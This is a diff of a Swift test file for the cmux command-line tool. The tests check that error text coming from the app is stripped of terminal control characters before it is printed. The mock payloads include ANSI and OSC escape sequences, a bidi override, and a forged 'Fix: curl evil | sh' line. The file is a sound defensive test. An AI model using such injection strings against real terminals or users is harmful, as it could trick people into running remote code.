@@ -53,12 +53,67 @@ struct CLIVersionSkewErrorTests {
 
     @Test("The same build keeps the plain method_not_found error")
     func sameBuildKeepsOriginalError() throws {
-        let cliPath = try BundledCLITestSupport.bundledCLIPath(for: CLITestBundleAnchor.self)
-        let version = try BundledCLITestSupport.appVersion(cliPath: cliPath)
-        let outcome = try run(identify: ["app": "cmux", "version": version, "build": "1"])
+        let cli = try cliIdentity()
+        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": cli.build])
         #expect(outcome.status == 1)
         #expect(outcome.stderr.contains("method_not_found"), Comment(rawValue: outcome.stderr))
         #expect(!outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
+    }
+
+    @Test("Terminal control characters in a plain v2 error are not printed")
+    func plainV2ErrorFieldsAreStripped() throws {
+        let cli = try cliIdentity()
+        let outcome = try run(
+            identify: ["app": "cmux", "version": cli.version, "build": cli.build],
+            errorMessage: "Unknown\u{1B}]0;pwned\u{07} method\u{2028}Fix: curl evil | sh",
+            errorExtras: [
+                "action": "Relaunch\u{1B}[2J cmux\u{202E}",
+                "reason": "line one\nline\u{9B}31m two\r",
+                "details": "detail\u{2029}forged",
+            ]
+        )
+        #expect(outcome.status == 1)
+        let printed = outcome.stderr
+        #expect(!printed.unicodeScalars.contains { scalar in
+            (scalar.properties.generalCategory == .control && scalar != "\n" && scalar != "\t")
+                || [0x202E, 0x2028, 0x2029].contains(scalar.value)
+        }, Comment(rawValue: printed.debugDescription))
+        // Real newlines in the app's text still lay out the sections.
+        #expect(printed.contains("method_not_found: Unknown]0;pwned methodFix: curl evil | sh"), Comment(rawValue: printed.debugDescription))
+        #expect(printed.contains("line one\n"), Comment(rawValue: printed.debugDescription))
+        #expect(printed.contains("Relaunch[2J cmux"), Comment(rawValue: printed.debugDescription))
+        #expect(printed.contains("detailforged"), Comment(rawValue: printed.debugDescription))
+    }
+
+    @Test("A newer build with the same version is reported as skew")
+    func newerBuildSameVersionIsSkew() throws {
+        let cli = try cliIdentity()
+        let newerBuild = try #require(Int(cli.build).map { String($0 + 1) }, Comment(rawValue: cli.build))
+        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": newerBuild])
+        #expect(outcome.status == 1)
+        #expect(outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
+        #expect(outcome.stderr.contains("cmux \(cli.version) (\(newerBuild))"), Comment(rawValue: outcome.stderr))
+        #expect(outcome.stderr.contains("This CLI is older than the app"), Comment(rawValue: outcome.stderr))
+    }
+
+    @Test("Terminal control characters from the app are not printed")
+    func peerControlCharactersAreStripped() throws {
+        let outcome = try run(
+            identify: [
+                "app": "cmux-next\u{1B}]0;pwned\u{07}",
+                "version": "0.3.0\u{1B}[2J",
+                "build": "4\u{9B}2",
+                "app_cli_path": "/opt/cmux-next/cmux\nFix: curl evil | sh",
+            ],
+            errorMessage: "Unknown method\u{1B}[31m"
+        )
+        #expect(outcome.status == 1)
+        #expect(outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
+        #expect(!outcome.stderr.unicodeScalars.contains { $0.properties.generalCategory == .control && $0 != "\n" },
+                Comment(rawValue: outcome.stderr.debugDescription))
+        #expect(!outcome.stderr.split(separator: "\n").contains { $0.hasPrefix("Fix: curl") },
+                Comment(rawValue: outcome.stderr.debugDescription))
+        #expect(outcome.stderr.contains("cmux-next]0;pwned 0.3.0[2J (42)"), Comment(rawValue: outcome.stderr.debugDescription))
     }
 
     // MARK: - Harness
@@ -72,7 +127,30 @@ struct CLIVersionSkewErrorTests {
         let rejected: [String]
     }
 
-    private func run(identify: [String: Any]?, arguments: [String] = ["workspace", "create"]) throws -> Outcome {
+    /// Short version and build of the CLI under test, from `cmux --version`
+    /// (`cmux 0.65.0 (108) [commit]`).
+    private func cliIdentity() throws -> (version: String, build: String) {
+        let cliPath = try BundledCLITestSupport.bundledCLIPath(for: CLITestBundleAnchor.self)
+        let version = try BundledCLITestSupport.appVersion(cliPath: cliPath)
+        let summary = CLIHookProcessRunner.run(
+            executablePath: cliPath,
+            arguments: ["--version"],
+            environment: [:],
+            timeout: 10
+        ).stdout
+        let build = try #require(
+            summary.split(separator: "(").dropFirst().first?.split(separator: ")").first.map(String.init),
+            Comment(rawValue: summary)
+        )
+        return (version, build)
+    }
+
+    private func run(
+        identify: [String: Any]?,
+        errorMessage: String? = nil,
+        errorExtras: [String: Any] = [:],
+        arguments: [String] = ["workspace", "create"]
+    ) throws -> Outcome {
         let cliPath = try BundledCLITestSupport.bundledCLIPath(for: CLITestBundleAnchor.self)
         let version = CLIHookProcessRunner.run(
             executablePath: cliPath,
@@ -83,7 +161,7 @@ struct CLIVersionSkewErrorTests {
 
         let socketPath = URL(fileURLWithPath: NSTemporaryDirectory())
             .appendingPathComponent("cli-skew-\(UUID().uuidString.prefix(8)).sock").path
-        let fixture = try SkewFixture(socketPath: socketPath, identify: identify)
+        let fixture = try SkewFixture(socketPath: socketPath, identify: identify, errorMessage: errorMessage, errorExtras: errorExtras)
         let served = fixture.start()
 
         var environment = ProcessInfo.processInfo.environment
@@ -92,6 +170,9 @@ struct CLIVersionSkewErrorTests {
         }
         environment["CMUX_SOCKET_PATH"] = socketPath
         environment["CMUX_CLI_SENTRY_DISABLED"] = "1"
+        // The assertions read English copy.
+        environment["AppleLanguages"] = "(en)"
+        environment["AppleLocale"] = "en_US"
         environment["CMUXTERM_CLI_RESPONSE_TIMEOUT_SEC"] = "2"
         let result = CLIHookProcessRunner.run(
             executablePath: cliPath,
@@ -125,12 +206,16 @@ private final class SkewFixture: @unchecked Sendable {
     private let socketPath: String
     private let listener: Int32
     private let identify: [String: Any]?
+    private let errorMessage: String?
+    private let errorExtras: [String: Any]
     private let stopped = NSLock()
     private var isStopped = false
 
-    init(socketPath: String, identify: [String: Any]?) throws {
+    init(socketPath: String, identify: [String: Any]?, errorMessage: String? = nil, errorExtras: [String: Any] = [:]) throws {
         self.socketPath = socketPath
         self.identify = identify
+        self.errorMessage = errorMessage
+        self.errorExtras = errorExtras
         unlink(socketPath)
         let descriptor = socket(AF_UNIX, SOCK_STREAM, 0)
         guard descriptor >= 0 else { throw POSIXError(.EIO) }
@@ -212,7 +297,11 @@ private final class SkewFixture: @unchecked Sendable {
             payload = [
                 "id": id,
                 "ok": false,
-                "error": ["code": "method_not_found", "message": "Unknown method \(method)", "data": ["method": method]],
+                "error": [
+                    "code": "method_not_found",
+                    "message": errorMessage ?? "Unknown method \(method)",
+                    "data": ["method": method],
+                ].merging(errorExtras) { current, _ in current },
             ]
         }
         let data = (try? JSONSerialization.data(withJSONObject: payload)) ?? Data("{}".utf8)
